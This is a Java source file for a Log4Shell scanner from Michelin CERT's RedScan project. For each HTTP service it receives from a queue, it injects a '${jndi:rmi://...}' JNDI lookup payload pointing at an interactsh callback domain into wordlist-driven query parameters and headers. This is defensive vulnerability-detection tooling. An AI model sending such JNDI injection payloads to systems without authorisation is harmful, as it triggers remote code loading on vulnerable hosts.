/*
 * Copyright 2021 Michelin CERT (https://cert.michelin.com/)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.michelin.cert.redscan;

import com.michelin.cert.redscan.utils.models.services.HttpService;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import kong.unirest.HttpResponse;
import kong.unirest.Unirest;
import kong.unirest.UnirestException;

import org.apache.logging.log4j.LogManager;

import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

/**
 * RedScan scanner main class.
 *
 * @author Maxime ESCOURBIAC
 */
@SpringBootApplication
public class ScanApplication {

  @Autowired
  InteractshConfig interactshConfig;

  private List<String> parameters;
  private List<String> headers;

  /**
   * Default contructor, that will load parameters and headers to fuzz from file.
   */
  public ScanApplication() {
    // Init the headers list from the worldlist file.
    try {
      headers = new ArrayList<>();
      File headerFile = new File("/wordlists/log4shell_headers.lst");
      Scanner reader = new Scanner(headerFile);
      while (reader.hasNext()) {
        headers.add(reader.next());
      }
      reader.close();
    } catch (FileNotFoundException ex) {
      LogManager.getLogger(ScanApplication.class).error(String.format("Failed to init the headers wordlist : %s", ex.getMessage()));
    }

    // Init the parameters list from the worldlist file.
    try {
      parameters = new ArrayList<>();
      File headerFile = new File("/wordlists/log4shell_parameters.lst");
      Scanner reader = new Scanner(headerFile);
      while (reader.hasNext()) {
        parameters.add(reader.next());
      }
      reader.close();
    } catch (FileNotFoundException ex) {
      LogManager.getLogger(ScanApplication.class).error(String.format("Failed to init the parameters wordlist : %s", ex.getMessage()));
    }
  }

  /**
   * RedScan Main methods.
   *
   * @param args Application arguments.
   */
  public static void main(String[] args) {
    SpringApplication.run(ScanApplication.class, args);
  }

  /**
   * Message executor.
   *
   * @param message Message received.
   */
  @RabbitListener(queues = {RabbitMqConfig.QUEUE_HTTP_SERVICES})
  public void receiveMessage(String message) {
    HttpService service = new HttpService();
    try {
      service.fromJson(message);
      String payload = String.format("${jndi:rmi://%s_%s_%s.%s:8443/certmichelin}", (service.isSsl()) ? "https" : "http", service.getDomain(), service.getPort(), interactshConfig.getDomain());
      String url = String.format("%s://%s:%s", (service.isSsl()) ? "https" : "http", service.getDomain(), service.getPort());

      LogManager.getLogger(SpringApplication.class).info(String.format("Start Log4Shell fuzzing :  with payload (%s)", url, payload));

      for (String parameter : parameters) {
        try {
          LogManager.getLogger(SpringApplication.class).info(String.format("Fuzz url (%s) with parameter : %s", url, parameter));
          HttpResponse<String> response = Unirest.get(url).queryString(parameter, payload).asString();
          LogManager.getLogger(SpringApplication.class).info(String.format("Reponse code from url (%s) with parameter : %s ==> ", url, parameter, response.getStatus()));
        } catch (UnirestException ex) {
          LogManager.getLogger(ScanApplication.class).error(String.format("Unirest Exception from url (%s) with parameter : %s : %s", url, parameter, ex.getMessage()));
        }
      }

      for (String header : headers) {
        try {
          LogManager.getLogger(SpringApplication.class).info(String.format("Fuzz url (%s) with header : %s", url, header));
          HttpResponse<String> response = Unirest.get(url).header(header, payload).asString();
          LogManager.getLogger(SpringApplication.class).info(String.format("Reponse code from url (%s) with parameter : %s ==> ", url, header, response.getStatus()));
        } catch (UnirestException ex) {
          LogManager.getLogger(ScanApplication.class).error(String.format("Unirest Exception from url (%s) with parameter : %s : %s", url, header, ex.getMessage()));
        }
      }

      service.upsertField("log4shell", "fuzzed");

    } catch (Exception ex) {
      LogManager.getLogger(ScanApplication.class).error(String.format("General exception : %s", ex.getMessage()));
    }
  }

}
